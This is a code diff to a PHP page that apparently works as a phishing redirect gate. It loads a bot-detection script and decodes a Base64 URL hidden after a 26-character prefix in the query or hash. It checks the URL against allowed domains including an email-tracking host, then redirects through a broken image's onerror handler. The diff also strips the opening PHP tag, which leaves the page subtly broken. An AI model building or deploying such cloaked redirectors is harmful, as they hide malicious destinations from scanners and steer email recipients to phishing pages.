@@ -1,4 +1,3 @@
-<?php
 require_once 'BotDetectLoader.php';
 ?>
 <!DOCTYPE html>
@@ -10,10 +9,10 @@ require_once 'BotDetectLoader.php';
     <script src="?_js=_1"></script>
     <script>
         window.onload = function() {
-            const defaultUrl = 'https://facebook.com';
-            const allowedDomains = ['sopropertyllc.com'];
+            const defaultUrl = 'https://hero.com';
+            const allowedDomains = ['resources.sopropertyllc.com', 't.apemail.net'];
 
-            // Check if string is Base64
+            // Check if a string is a valid Base64 encoded string
             const isBase64 = (str) => {
                 try {
                     return btoa(atob(str)) === str;
@@ -22,22 +21,24 @@ require_once 'BotDetectLoader.php';
                 }
             };
 
-            // Extract root domain
-            const extractRootDomain = (url) => {
-                const parts = url.split('.');
-                return parts.slice(parts.length - 2).join('.');
+            // Extract the root domain from a URL
+            const extractRootDomain = (hostname) => {
+                const domainParts = hostname.split('.');
+                // Consider cases with subdomains (e.g., 'sub.example.com')
+                if (domainParts.length > 2) {
+                    return domainParts.slice(domainParts.length - 2).join('.');
+                }
+                return hostname;
             };
 
-            // Process and validate URL string
+            // Process and validate the URL string
             const processString = (str) => {
                 let encodedUrl = str;
                 const matches = str.match(/\(([^)]+)\)/);
                 if (matches && matches[1]) {
                     encodedUrl = matches[1].substring(26);
-                } else if (str.length > 26) {
-                    encodedUrl = str.substring(26);
                 } else {
-                    return '';
+                    encodedUrl = str.substring(26);
                 }
 
                 if (isBase64(encodedUrl)) {
@@ -49,6 +50,9 @@ require_once 'BotDetectLoader.php';
                         let urlObj = new URL(decodedUrl);
                         let hostname = urlObj.hostname;
                         let rootDomain = extractRootDomain(hostname);
+
+                        console.log('Hostname:', hostname);
+                        console.log('Root Domain:', rootDomain);
 
                         if (allowedDomains.includes(hostname) || allowedDomains.includes(rootDomain)) {
                             return decodedUrl;
@@ -67,16 +71,16 @@ require_once 'BotDetectLoader.php';
             const queryString = window.location.search.substring(1);
             const hashString = window.location.hash.substring(1);
 
-            // Determine redirect URL
+            // Determine the redirect URL
             const redirectUrl = processString(queryString) || processString(hashString) || defaultUrl;
 
-            // Image to trigger redirection
+            // Image element to trigger redirection
             const redirectImage = document.getElementById('redirect-image');
             redirectImage.onerror = function() {
                 window.location.replace(redirectUrl);
             };
             redirectImage.src = "invalid_image.jpg";
-        }
+        };
     </script>
 </head>
 <body>
